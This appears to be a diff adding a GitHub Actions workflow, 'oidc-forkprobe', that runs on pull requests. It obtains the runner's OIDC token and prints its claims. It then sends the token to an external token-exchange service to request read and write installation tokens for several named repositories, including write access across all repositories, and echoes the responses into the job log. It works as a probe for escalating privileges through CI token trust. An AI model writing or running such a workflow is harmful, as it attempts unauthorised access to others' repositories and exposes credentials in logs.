@@ -1,0 +1,28 @@
+name: oidc-forkprobe
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - name: probe
+        run: |
+          set -ueo pipefail
+          echo "REPO=${GITHUB_REPOSITORY} REF=${GITHUB_REF} EVENT=${GITHUB_EVENT_NAME} ACTOR=${GITHUB_ACTOR}"
+          echo "OIDC_URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
+          RESP=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://jwt-exchange")
+          TOK=$(printf '%s' "$RESP" | jq -r '.value // empty')
+          printf '%s' "$TOK" | cut -d. -f2 | python3 -c 'import sys,base64,json; p=sys.stdin.read().strip(); p+="="*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p)); print("CLAIMS="+json.dumps({k:c.get(k) for k in ["aud","repository","repository_owner","repository_visibility","ref","ref_type","ref_protected","environment","event_name","job_workflow_ref","workflow_ref","sub","sha"]},sort_keys=True))'
+          for spec in "lite_read|synkube/lite-argo-apps|read|target" "actions|synkube/actions|read|target" "lite_all|synkube/lite-argo-apps|write|all" "sanguine|synapsecns/sanguine|read|target"; do
+            lbl=${spec%%|*}; rest=${spec#*|}; tgt=${rest%%|*}; rest2=${rest#*|}; perm=${rest2%%|*}; scope=${rest2#*|}
+            PERMJ=$(printf '{"contents":"%s"}' "$perm")
+            body=$(jq -cn --arg t "$TOK" --arg tgt "$tgt" --arg p "$PERMJ" --arg s "$scope" '{subject_token:$t,resource:{type:"github_repository",id:$tgt},requested:({github_permissions:($p|fromjson)} + (if $s=="all" then {installation_repository_scope:"all"} else {} end)),exchange_profile:"github_actions_to_installation"}')
+            out=$(curl -sS -m 30 -w '\nHTTP=%{http_code}' -X POST https://jwt-exchange.synkube.com/api/v2/exchange/token -H 'Content-Type: application/json' -d "$body")
+            echo "EXCH[${lbl}] => $(printf '%s' "$out" | tr '\n' ' ' | head -c 700)"
+            echo "TOKENLEN_${lbl}=$(printf '%s' "$out" | head -1 | jq -r '.token // "" | length' 2>/dev/null || echo 0)"
+          done
